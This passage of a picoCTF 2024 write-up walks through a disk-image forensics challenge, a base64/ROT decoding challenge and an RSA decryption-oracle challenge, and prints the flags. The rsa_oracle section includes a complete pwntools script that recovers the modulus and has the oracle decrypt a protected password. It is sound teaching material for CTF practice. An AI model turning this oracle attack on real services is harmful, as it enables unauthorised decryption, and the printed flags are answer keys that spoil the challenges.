![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2ca8f783-a07e-45bb-a687-53a5600586ea)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/91083249-9c1a-4336-b75f-b9de2bfcba1f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6f3ff26e-2163-4d37-8851-f13e213d588f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/de25cfd8-abec-422d-b1ee-621690e124b0)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3ae42472-451c-4faa-9c7e-f07b95199276)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b15974e4-079f-4aff-bb83-1c4fe2c6270e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c3864000-1855-4279-8992-4ba544ecbc16)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9bb944f1-bd07-4a40-8858-139ec0e8ae6a)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5323f364-df9f-4994-a7cd-a9a284f008ee)

We have 2 extended file system, trust me there isn't anything in the first partition, just junks hehe. Lets analyze the 3rd partition

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/464a8588-5ea0-4410-82d3-992b23383156)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4dafff74-a8eb-4632-a5da-0dc84cf4deef)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/45996b92-da3e-4c8d-9e0f-d9026f07e254)

In the ```root/``` directory you'll find a ```.ash_history``` file and a ```secret-secrets/``` directory, in the ```secret-secrets/``` directory you'll see 2 empty files and then a bash script ```force-wait.sh```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/104efdda-5212-4ac0-84a3-a13d1dc30b95)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fde73619-3e7f-4246-a84e-bfd54eda3156)

We don't need the bash script, we are only interested in those 2 files ```innocuous-file.txt``` and ```its-all-in-the-name```, these files are empty actually or so you thought hehe.

Look at the name of the second file ```its-all-in-the-name```, this means it's making reference to the first file ```innocuous-file.txt```, so instead of searching for ```flag.txt``` or ```picoCTF{```😂, I searched for ```innocuous``` instead

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3635015d-e11c-4b3f-96f3-adaabd91745a)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/440d827c-3505-4e17-9a8d-2dabe5a624ee)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ec9f0d72-7529-4c2a-9ffe-682f4fc96e55)

We got 14 hits hehe, check the 4th, 5th and 6th fragment, you'll see something interesting

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/335801fa-879a-4850-be1d-e492b02e1564)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f79aad4-fa1b-4b69-9020-f0d0d414671f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6b76931c-71ca-451f-aa88-bf15fc6a6077)

Putting together what we got from the 3 fragments, you should have something like this ```picoCTF{1```, this means the flag was distributed amongst the fragments.

Checking the other fragments should get you the remaining parts of the flag. Easy right??😎

FLAG:- ```picoCTF{1_533_n4m35_80d24b30}```


# Cryptography

## interencdec (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8e6b0549-a141-473c-98fc-ebf0eeb8dfa5)
 
This was actually a very easy one

Download the challenge file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ ls -la
total 12
drwxr-xr-x 2 bl4ck4non bl4ck4non 4096 Mar 25 08:01 .
drwxr-xr-x 3 bl4ck4non bl4ck4non 4096 Mar 25 08:00 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non   73 Mar 25 08:00 enc_flag
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ cat enc_flag          
YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==
```
So we've got a base64 encoded text, lets decode this

command:```echo "YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ echo "YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==" | base64 -d
b'd3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ=='
```
We got another base64 encoded text, lets decode further

command:```echo "d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/interendec]
└─$ echo "d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ==" | base64 -d                        
wpjvJAM{jhlzhy_k3jy9wa3k_86kl32k2}
```
Now we've got a rot cipher, we can decode this using [dcode.fr](https://www.dcode.fr/rot-cipher)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1b903caa-ed13-439b-a939-534647c846e6)

We got our flag

FLAG:- ```picoCTF{caesar_d3cr9pt3d_86de32d2}```

--------------------------------------

## rsa_oracle (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ee1ded93-ea26-4370-9af3-b0d7288281ea)

Download the challenge files

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c89ca294-cf49-4659-96a4-34a46a4df8d9)

We basically are meant to use that password to decrypt the cipher text. They also provided us an instance of the oracle that was used to encrypt the password

We'll try to recover the password using rsa actually, we can use this python script my teammate wrote

```python
import subprocess
from math import gcd
from warnings import filterwarnings

from Crypto.Util.number import bytes_to_long, long_to_bytes
from pwn import *

def establish_connection():
    io = remote("titan.picoctf.net", 56147)
    context.log_level = 'info'
    filterwarnings("ignore")
    return io

def send_message_and_get_response(io, message):
    io.sendline("E")
    io.sendline(message)
    io.recvuntil("n) ")
    response = int(io.recvline().decode())
    return response

def calculate_n(c1, c2, m1, m2, e):
    k1n = (bytes_to_long(m1) ** e) - c1
    k2n = (bytes_to_long(m2) ** e) - c2
    n = gcd(k1n, k2n)
    return n

def read_encrypted_password():
    with open("password.enc", "r") as fp:
        ct = fp.read()
    return ct

def main():
    io = establish_connection()

    m1 = b'a'
    m2 = b'b'
    e = 65537 

    c1 = send_message_and_get_response(io, m1)
    c2 = send_message_and_get_response(io, m2)

    n = calculate_n(c1, c2, m1, m2, e)
    assert c1 == pow(bytes_to_long(m1), e, n)
    print(f"n: {n}")

    ct = read_encrypted_password()
    pad = n + int(ct)
    print(f"pad: {pad}")

    io.sendline("D")
    io.sendline(str(pad))
    
    io.recvuntil(": ")
    pt = bytes.fromhex(io.recvline().decode().split()[-1])
    print(f"AES Password: {pt}")

if __name__ == "__main__":
    main()
```

The script establishes a connection to the remote server, sends encrypted messages, calculates a value based on the received ciphertexts and plaintexts, reads an encrypted password from a file, calculates a value based on the password and server's responses, sends this value to the server, and retrieves a decrypted AES password.

Lets run the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d08e277-0e5f-435c-9f4c-f213a54dc32a)

You can see we got the AES password to be ```60f50```.

Nw that we have the password lets decrypt the message . We can use openssl for that

command:```openssl enc -d -aes-256-cbc -in secret.enc -out abeg.data```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ openssl enc -d -aes-256-cbc -in secret.enc -out abeg.data 
enter AES-256-CBC decryption password:
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ ls -la                                                   
total 24
drwxr-xr-x 2 bl4ck4non bl4ck4non 4096 Mar 26 14:50 .
drwxr-xr-x 4 bl4ck4non bl4ck4non 4096 Mar 26 14:28 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non   38 Mar 26 14:50 abeg.data
-rw-r--r-- 1 bl4ck4non bl4ck4non 1327 Mar 26 14:46 bankai.py
-rw-r--r-- 1 bl4ck4non bl4ck4non  154 Mar 26 14:29 password.enc
-rw-r--r-- 1 bl4ck4non bl4ck4non   64 Mar 26 14:29 secret.enc
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ file abeg.data    
abeg.data: ASCII text, with no line terminators
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/cryptography/rsa_oracle]
└─$ cat abeg.data  
picoCTF{su((3ss_(r@ck1ng_r3@_60f50766}
```
We got our flag hehe😎

FLAG:- ```picoCTF{su((3ss_(r@ck1ng_r3@_60f50766}```

--------------------------------------


Till Next Time :xD





<br> <br>
[Back To Home](../../index.md)



























